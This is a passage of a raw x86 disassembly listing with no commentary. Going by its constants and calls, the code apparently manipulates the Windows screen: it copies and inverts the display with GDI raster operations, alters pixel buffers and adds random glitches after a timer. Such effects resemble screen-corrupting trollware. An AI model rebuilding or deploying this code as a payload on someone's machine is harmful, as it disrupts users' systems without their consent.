  402d3b:	ff d0                	call   *%eax
  402d3d:	83 ec 24             	sub    $0x24,%esp
  402d40:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402d43:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  402d47:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  402d4e:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402d51:	89 44 24 08          	mov    %eax,0x8(%esp)
  402d55:	89 54 24 04          	mov    %edx,0x4(%esp)
  402d59:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402d5c:	89 04 24             	mov    %eax,(%esp)
  402d5f:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  402d64:	ff d0                	call   *%eax
  402d66:	83 ec 0c             	sub    $0xc,%esp
  402d69:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402d70:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402d73:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  402d77:	39 45 f0             	cmp    %eax,-0x10(%ebp)
  402d7a:	7d 44                	jge    0x402dc0
  402d7c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d7f:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  402d86:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402d89:	01 d0                	add    %edx,%eax
  402d8b:	8b 00                	mov    (%eax),%eax
  402d8d:	8d 0c 00             	lea    (%eax,%eax,1),%ecx
  402d90:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402d93:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  402d9a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402d9d:	8d 1c 02             	lea    (%edx,%eax,1),%ebx
  402da0:	ba 01 00 c0 c0       	mov    $0xc0c00001,%edx
  402da5:	89 c8                	mov    %ecx,%eax
  402da7:	f7 e2                	mul    %edx
  402da9:	89 d0                	mov    %edx,%eax
  402dab:	c1 e8 17             	shr    $0x17,%eax
  402dae:	69 c0 aa 00 aa 00    	imul   $0xaa00aa,%eax,%eax
  402db4:	29 c1                	sub    %eax,%ecx
  402db6:	89 c8                	mov    %ecx,%eax
  402db8:	89 03                	mov    %eax,(%ebx)
  402dba:	83 45 f0 01          	addl   $0x1,-0x10(%ebp)
  402dbe:	eb b0                	jmp    0x402d70
  402dc0:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402dc3:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  402dc7:	c1 e0 02             	shl    $0x2,%eax
  402dca:	89 c2                	mov    %eax,%edx
  402dcc:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402dcf:	89 44 24 08          	mov    %eax,0x8(%esp)
  402dd3:	89 54 24 04          	mov    %edx,0x4(%esp)
  402dd7:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402dda:	89 04 24             	mov    %eax,(%esp)
  402ddd:	a1 00 a2 40 00       	mov    0x40a200,%eax
  402de2:	ff d0                	call   *%eax
  402de4:	83 ec 0c             	sub    $0xc,%esp
  402de7:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  402dee:	00 
  402def:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402df6:	00 
  402df7:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402dfe:	00 
  402dff:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402e02:	89 44 24 14          	mov    %eax,0x14(%esp)
  402e06:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402e09:	89 44 24 10          	mov    %eax,0x10(%esp)
  402e0d:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402e10:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402e14:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402e1b:	00 
  402e1c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402e23:	00 
  402e24:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402e27:	89 04 24             	mov    %eax,(%esp)
  402e2a:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  402e2f:	ff d0                	call   *%eax
  402e31:	83 ec 24             	sub    $0x24,%esp
  402e34:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402e37:	89 04 24             	mov    %eax,(%esp)
  402e3a:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  402e3f:	ff d0                	call   *%eax
  402e41:	83 ec 04             	sub    $0x4,%esp
  402e44:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402e47:	89 04 24             	mov    %eax,(%esp)
  402e4a:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  402e4f:	ff d0                	call   *%eax
  402e51:	83 ec 04             	sub    $0x4,%esp
  402e54:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402e57:	89 04 24             	mov    %eax,(%esp)
  402e5a:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  402e5f:	ff d0                	call   *%eax
  402e61:	83 ec 04             	sub    $0x4,%esp
  402e64:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  402e68:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402e6b:	ba 56 55 55 55       	mov    $0x55555556,%edx
  402e70:	89 c8                	mov    %ecx,%eax
  402e72:	f7 ea                	imul   %edx
  402e74:	89 c8                	mov    %ecx,%eax
  402e76:	c1 f8 1f             	sar    $0x1f,%eax
  402e79:	29 c2                	sub    %eax,%edx
  402e7b:	89 d0                	mov    %edx,%eax
  402e7d:	01 c0                	add    %eax,%eax
  402e7f:	01 d0                	add    %edx,%eax
  402e81:	29 c1                	sub    %eax,%ecx
  402e83:	89 c8                	mov    %ecx,%eax
  402e85:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402e88:	e9 f7 fd ff ff       	jmp    0x402c84
  402e8d:	55                   	push   %ebp
  402e8e:	89 e5                	mov    %esp,%ebp
  402e90:	53                   	push   %ebx
  402e91:	83 ec 64             	sub    $0x64,%esp
  402e94:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  402e99:	ff d0                	call   *%eax
  402e9b:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402e9e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402ea5:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402eaa:	ff d0                	call   *%eax
  402eac:	83 ec 04             	sub    $0x4,%esp
  402eaf:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402eb2:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402eb9:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402ebe:	ff d0                	call   *%eax
  402ec0:	83 ec 04             	sub    $0x4,%esp
  402ec3:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  402ec6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402ec9:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  402ecd:	89 c2                	mov    %eax,%edx
  402ecf:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402ed2:	01 d0                	add    %edx,%eax
  402ed4:	c1 e0 02             	shl    $0x2,%eax
  402ed7:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  402ede:	00 
  402edf:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  402ee6:	00 
  402ee7:	89 44 24 04          	mov    %eax,0x4(%esp)
  402eeb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402ef2:	a1 64 a2 40 00       	mov    0x40a264,%eax
  402ef7:	ff d0                	call   *%eax
  402ef9:	83 ec 10             	sub    $0x10,%esp
  402efc:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402eff:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  402f06:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402f0d:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402f12:	ff d0                	call   *%eax
  402f14:	83 ec 04             	sub    $0x4,%esp
  402f17:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402f1a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402f1d:	89 04 24             	mov    %eax,(%esp)
  402f20:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  402f25:	ff d0                	call   *%eax
  402f27:	83 ec 04             	sub    $0x4,%esp
  402f2a:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402f2d:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402f30:	89 44 24 10          	mov    %eax,0x10(%esp)
  402f34:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  402f3b:	00 
  402f3c:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  402f43:	00 
  402f44:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402f47:	89 44 24 04          	mov    %eax,0x4(%esp)
  402f4b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402f4e:	89 04 24             	mov    %eax,(%esp)
  402f51:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  402f56:	ff d0                	call   *%eax
  402f58:	83 ec 14             	sub    $0x14,%esp
  402f5b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402f5e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402f61:	89 44 24 04          	mov    %eax,0x4(%esp)
  402f65:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402f68:	89 04 24             	mov    %eax,(%esp)
  402f6b:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  402f70:	ff d0                	call   *%eax
  402f72:	83 ec 08             	sub    $0x8,%esp
  402f75:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  402f7c:	00 
  402f7d:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  402f84:	00 
  402f85:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402f8c:	00 
  402f8d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402f90:	89 44 24 14          	mov    %eax,0x14(%esp)
  402f94:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402f97:	89 44 24 10          	mov    %eax,0x10(%esp)
  402f9b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402f9e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  402fa2:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402fa9:	00 
  402faa:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402fb1:	00 
  402fb2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402fb5:	89 04 24             	mov    %eax,(%esp)
  402fb8:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  402fbd:	ff d0                	call   *%eax
  402fbf:	83 ec 24             	sub    $0x24,%esp
  402fc2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  402fc5:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  402fc9:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  402fd0:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402fd3:	89 44 24 08          	mov    %eax,0x8(%esp)
  402fd7:	89 54 24 04          	mov    %edx,0x4(%esp)
  402fdb:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402fde:	89 04 24             	mov    %eax,(%esp)
  402fe1:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  402fe6:	ff d0                	call   *%eax
  402fe8:	83 ec 0c             	sub    $0xc,%esp
  402feb:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  402ff2:	c6 45 cf 00          	movb   $0x0,-0x31(%ebp)
  402ff6:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  402ffb:	ff d0                	call   *%eax
  402ffd:	8b 55 ec             	mov    -0x14(%ebp),%edx
  403000:	29 d0                	sub    %edx,%eax
  403002:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  403007:	0f 97 c0             	seta   %al
  40300a:	84 c0                	test   %al,%al
  40300c:	74 2f                	je     0x40303d
  40300e:	e8 25 3e 00 00       	call   0x406e38
  403013:	89 c1                	mov    %eax,%ecx
  403015:	ba 81 80 80 80       	mov    $0x80808081,%edx
  40301a:	89 c8                	mov    %ecx,%eax
  40301c:	f7 ea                	imul   %edx
  40301e:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  403021:	c1 f8 07             	sar    $0x7,%eax
  403024:	89 c2                	mov    %eax,%edx
  403026:	89 c8                	mov    %ecx,%eax
  403028:	c1 f8 1f             	sar    $0x1f,%eax
  40302b:	29 c2                	sub    %eax,%edx
  40302d:	89 d0                	mov    %edx,%eax
  40302f:	89 c2                	mov    %eax,%edx
  403031:	c1 e2 08             	shl    $0x8,%edx
  403034:	29 c2                	sub    %eax,%edx
  403036:	89 c8                	mov    %ecx,%eax
  403038:	29 d0                	sub    %edx,%eax
  40303a:	88 45 cf             	mov    %al,-0x31(%ebp)
  40303d:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403044:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403047:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  40304b:	39 45 f0             	cmp    %eax,-0x10(%ebp)
  40304e:	0f 8d bf 00 00 00    	jge    0x403113
  403054:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403057:	99                   	cltd
  403058:	f7 7d e4             	idivl  -0x1c(%ebp)
  40305b:	89 d0                	mov    %edx,%eax
  40305d:	85 c0                	test   %eax,%eax
  40305f:	75 2e                	jne    0x40308f
  403061:	e8 d2 3d 00 00       	call   0x406e38
  403066:	89 c1                	mov    %eax,%ecx
  403068:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  40306d:	89 c8                	mov    %ecx,%eax
  40306f:	f7 ea                	imul   %edx
  403071:	c1 fa 05             	sar    $0x5,%edx
  403074:	89 c8                	mov    %ecx,%eax
  403076:	c1 f8 1f             	sar    $0x1f,%eax
  403079:	29 c2                	sub    %eax,%edx
  40307b:	89 d0                	mov    %edx,%eax
  40307d:	6b c0 64             	imul   $0x64,%eax,%eax
  403080:	29 c1                	sub    %eax,%ecx
  403082:	89 c8                	mov    %ecx,%eax
  403084:	85 c0                	test   %eax,%eax
  403086:	75 07                	jne    0x40308f
  403088:	b8 01 00 00 00       	mov    $0x1,%eax
  40308d:	eb 05                	jmp    0x403094
  40308f:	b8 00 00 00 00       	mov    $0x0,%eax
  403094:	84 c0                	test   %al,%al
  403096:	74 35                	je     0x4030cd
  403098:	e8 9b 3d 00 00       	call   0x406e38
  40309d:	89 c1                	mov    %eax,%ecx
  40309f:	ba 89 88 88 88       	mov    $0x88888889,%edx
  4030a4:	89 c8                	mov    %ecx,%eax
  4030a6:	f7 ea                	imul   %edx
  4030a8:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4030ab:	c1 f8 03             	sar    $0x3,%eax
  4030ae:	89 c2                	mov    %eax,%edx
  4030b0:	89 c8                	mov    %ecx,%eax
  4030b2:	c1 f8 1f             	sar    $0x1f,%eax
  4030b5:	29 c2                	sub    %eax,%edx
  4030b7:	89 d0                	mov    %edx,%eax
  4030b9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4030bc:	8b 55 d0             	mov    -0x30(%ebp),%edx
  4030bf:	89 d0                	mov    %edx,%eax
  4030c1:	c1 e0 04             	shl    $0x4,%eax
  4030c4:	29 d0                	sub    %edx,%eax
  4030c6:	29 c1                	sub    %eax,%ecx
  4030c8:	89 c8                	mov    %ecx,%eax
  4030ca:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4030cd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030d0:	c1 e0 02             	shl    $0x2,%eax
  4030d3:	8d 50 09             	lea    0x9(%eax),%edx
  4030d6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4030d9:	01 d0                	add    %edx,%eax
  4030db:	0f b6 08             	movzbl (%eax),%ecx
  4030de:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030e1:	83 c0 0b             	add    $0xb,%eax
  4030e4:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  4030eb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4030ee:	01 d0                	add    %edx,%eax
  4030f0:	83 c0 09             	add    $0x9,%eax
  4030f3:	0f b6 10             	movzbl (%eax),%edx
  4030f6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4030f9:	c1 e0 02             	shl    $0x2,%eax
  4030fc:	8d 58 09             	lea    0x9(%eax),%ebx
  4030ff:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403102:	01 d8                	add    %ebx,%eax
  403104:	29 d1                	sub    %edx,%ecx
  403106:	89 ca                	mov    %ecx,%edx
  403108:	88 10                	mov    %dl,(%eax)
  40310a:	83 45 f0 01          	addl   $0x1,-0x10(%ebp)
  40310e:	e9 31 ff ff ff       	jmp    0x403044
  403113:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403116:	0f af 45 e4          	imul   -0x1c(%ebp),%eax
  40311a:	c1 e0 02             	shl    $0x2,%eax
  40311d:	89 c2                	mov    %eax,%edx
  40311f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403122:	89 44 24 08          	mov    %eax,0x8(%esp)
  403126:	89 54 24 04          	mov    %edx,0x4(%esp)
  40312a:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40312d:	89 04 24             	mov    %eax,(%esp)
  403130:	a1 00 a2 40 00       	mov    0x40a200,%eax
  403135:	ff d0                	call   *%eax
  403137:	83 ec 0c             	sub    $0xc,%esp
  40313a:	c7 44 24 20 08 00 33 	movl   $0x330008,0x20(%esp)
  403141:	00 
  403142:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  403149:	00 
  40314a:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  403151:	00 
  403152:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403155:	89 44 24 14          	mov    %eax,0x14(%esp)
  403159:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40315c:	89 44 24 10          	mov    %eax,0x10(%esp)
  403160:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403163:	89 44 24 0c          	mov    %eax,0xc(%esp)
  403167:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40316e:	00 
  40316f:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  403176:	00 
  403177:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40317a:	89 04 24             	mov    %eax,(%esp)
  40317d:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  403182:	ff d0                	call   *%eax
  403184:	83 ec 24             	sub    $0x24,%esp
  403187:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40318a:	89 44 24 04          	mov    %eax,0x4(%esp)
  40318e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403195:	a1 04 a3 40 00       	mov    0x40a304,%eax
  40319a:	ff d0                	call   *%eax
  40319c:	83 ec 08             	sub    $0x8,%esp
  40319f:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4031a2:	89 04 24             	mov    %eax,(%esp)
  4031a5:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  4031aa:	ff d0                	call   *%eax
  4031ac:	83 ec 04             	sub    $0x4,%esp
  4031af:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4031b2:	89 04 24             	mov    %eax,(%esp)
  4031b5:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  4031ba:	ff d0                	call   *%eax
  4031bc:	83 ec 04             	sub    $0x4,%esp
  4031bf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4031c2:	89 04 24             	mov    %eax,(%esp)
  4031c5:	a1 f0 a1 40 00       	mov    0x40a1f0,%eax
  4031ca:	ff d0                	call   *%eax
  4031cc:	83 ec 04             	sub    $0x4,%esp
  4031cf:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  4031d3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4031d6:	ba 56 55 55 55       	mov    $0x55555556,%edx
  4031db:	89 c8                	mov    %ecx,%eax
  4031dd:	f7 ea                	imul   %edx
  4031df:	89 c8                	mov    %ecx,%eax
  4031e1:	c1 f8 1f             	sar    $0x1f,%eax
  4031e4:	29 c2                	sub    %eax,%edx
  4031e6:	89 d0                	mov    %edx,%eax
  4031e8:	01 c0                	add    %eax,%eax
  4031ea:	01 d0                	add    %edx,%eax
  4031ec:	29 c1                	sub    %eax,%ecx
  4031ee:	89 c8                	mov    %ecx,%eax
  4031f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4031f3:	e9 0e fd ff ff       	jmp    0x402f06
  4031f8:	55                   	push   %ebp
  4031f9:	89 e5                	mov    %esp,%ebp
  4031fb:	53                   	push   %ebx
  4031fc:	83 ec 74             	sub    $0x74,%esp
  4031ff:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  403204:	ff d0                	call   *%eax
  403206:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403209:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403210:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403215:	ff d0                	call   *%eax
  403217:	83 ec 04             	sub    $0x4,%esp
  40321a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40321d:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  403224:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  403229:	ff d0                	call   *%eax
  40322b:	83 ec 04             	sub    $0x4,%esp
  40322e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  403231:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403234:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403238:	89 c2                	mov    %eax,%edx
  40323a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40323d:	01 d0                	add    %edx,%eax
  40323f:	c1 e0 02             	shl    $0x2,%eax
  403242:	c7 44 24 0c 04 00 00 	movl   $0x4,0xc(%esp)
  403249:	00 
  40324a:	c7 44 24 08 00 30 00 	movl   $0x3000,0x8(%esp)
  403251:	00 
  403252:	89 44 24 04          	mov    %eax,0x4(%esp)
  403256:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40325d:	a1 64 a2 40 00       	mov    0x40a264,%eax
  403262:	ff d0                	call   *%eax
  403264:	83 ec 10             	sub    $0x10,%esp
  403267:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40326a:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  403271:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403278:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  40327d:	ff d0                	call   *%eax
  40327f:	83 ec 04             	sub    $0x4,%esp
  403282:	89 45 d8             	mov    %eax,-0x28(%ebp)
  403285:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403288:	89 04 24             	mov    %eax,(%esp)
  40328b:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  403290:	ff d0                	call   *%eax
  403292:	83 ec 04             	sub    $0x4,%esp
  403295:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403298:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40329b:	89 44 24 10          	mov    %eax,0x10(%esp)
  40329f:	c7 44 24 0c 20 00 00 	movl   $0x20,0xc(%esp)
  4032a6:	00 
  4032a7:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4032ae:	00 
  4032af:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4032b2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4032b6:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4032b9:	89 04 24             	mov    %eax,(%esp)
  4032bc:	a1 dc a1 40 00       	mov    0x40a1dc,%eax
  4032c1:	ff d0                	call   *%eax
  4032c3:	83 ec 14             	sub    $0x14,%esp
  4032c6:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4032c9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4032cc:	89 44 24 04          	mov    %eax,0x4(%esp)
  4032d0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4032d3:	89 04 24             	mov    %eax,(%esp)
  4032d6:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  4032db:	ff d0                	call   *%eax
  4032dd:	83 ec 08             	sub    $0x8,%esp
  4032e0:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  4032e7:	00 
  4032e8:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4032ef:	00 
  4032f0:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4032f7:	00 
  4032f8:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4032fb:	89 44 24 14          	mov    %eax,0x14(%esp)
  4032ff:	8b 45 e0             	mov    -0x20(%ebp),%eax
  403302:	89 44 24 10          	mov    %eax,0x10(%esp)
  403306:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403309:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40330d:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  403314:	00 
  403315:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40331c:	00 
  40331d:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  403320:	89 04 24             	mov    %eax,(%esp)
  403323:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  403328:	ff d0                	call   *%eax
  40332a:	83 ec 24             	sub    $0x24,%esp
  40332d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  403330:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  403334:	8d 14 85 00 00 00 00 	lea    0x0(,%eax,4),%edx
  40333b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40333e:	89 44 24 08          	mov    %eax,0x8(%esp)
  403342:	89 54 24 04          	mov    %edx,0x4(%esp)
  403346:	8b 45 d0             	mov    -0x30(%ebp),%eax
  403349:	89 04 24             	mov    %eax,(%esp)
  40334c:	a1 f4 a1 40 00       	mov    0x40a1f4,%eax
  403351:	ff d0                	call   *%eax
  403353:	83 ec 0c             	sub    $0xc,%esp
  403356:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40335d:	c6 45 cf 00          	movb   $0x0,-0x31(%ebp)
  403361:	a1 3c a2 40 00       	mov    0x40a23c,%eax
  403366:	ff d0                	call   *%eax
  403368:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40336b:	29 d0                	sub    %edx,%eax
  40336d:	3d 60 ea 00 00       	cmp    $0xea60,%eax
  403372:	0f 97 c0             	seta   %al
  403375:	84 c0                	test   %al,%al
  403377:	74 2f                	je     0x4033a8
  403379:	e8 ba 3a 00 00       	call   0x406e38
  40337e:	89 c1                	mov    %eax,%ecx
  403380:	ba 81 80 80 80       	mov    $0x80808081,%edx
  403385:	89 c8                	mov    %ecx,%eax
  403387:	f7 ea                	imul   %edx
  403389:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  40338c:	c1 f8 07             	sar    $0x7,%eax
  40338f:	89 c2                	mov    %eax,%edx
  403391:	89 c8                	mov    %ecx,%eax
  403393:	c1 f8 1f             	sar    $0x1f,%eax
  403396:	29 c2                	sub    %eax,%edx
  403398:	89 d0                	mov    %edx,%eax
  40339a:	89 c2                	mov    %eax,%edx
  40339c:	c1 e2 08             	shl    $0x8,%edx
  40339f:	29 c2                	sub    %eax,%edx
  4033a1:	89 c8                	mov    %ecx,%eax
  4033a3:	29 d0                	sub    %edx,%eax
  4033a5:	88 45 cf             	mov    %al,-0x31(%ebp)
  4033a8:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4033af:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4033b2:	0f af 45 e0          	imul   -0x20(%ebp),%eax
  4033b6:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  4033b9:	0f 8d ca 00 00 00    	jge    0x403489
  4033bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4033c2:	99                   	cltd
  4033c3:	f7 7d e4             	idivl  -0x1c(%ebp)
  4033c6:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4033c9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4033cc:	99                   	cltd
  4033cd:	f7 7d e0             	idivl  -0x20(%ebp)
  4033d0:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4033d3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4033d6:	99                   	cltd
  4033d7:	f7 7d e0             	idivl  -0x20(%ebp)
  4033da:	89 d0                	mov    %edx,%eax
  4033dc:	85 c0                	test   %eax,%eax
  4033de:	75 2e                	jne    0x40340e
  4033e0:	e8 53 3a 00 00       	call   0x406e38
  4033e5:	89 c1                	mov    %eax,%ecx
  4033e7:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  4033ec:	89 c8                	mov    %ecx,%eax
  4033ee:	f7 ea                	imul   %edx
  4033f0:	c1 fa 05             	sar    $0x5,%edx
  4033f3:	89 c8                	mov    %ecx,%eax
  4033f5:	c1 f8 1f             	sar    $0x1f,%eax
  4033f8:	29 c2                	sub    %eax,%edx
  4033fa:	89 d0                	mov    %edx,%eax
  4033fc:	6b c0 64             	imul   $0x64,%eax,%eax
  4033ff:	29 c1                	sub    %eax,%ecx
  403401:	89 c8                	mov    %ecx,%eax
  403403:	85 c0                	test   %eax,%eax
  403405:	75 07                	jne    0x40340e
  403407:	b8 01 00 00 00       	mov    $0x1,%eax
  40340c:	eb 05                	jmp    0x403413
  40340e:	b8 00 00 00 00       	mov    $0x0,%eax
  403413:	84 c0                	test   %al,%al
  403415:	74 32                	je     0x403449
  403417:	e8 1c 3a 00 00       	call   0x406e38
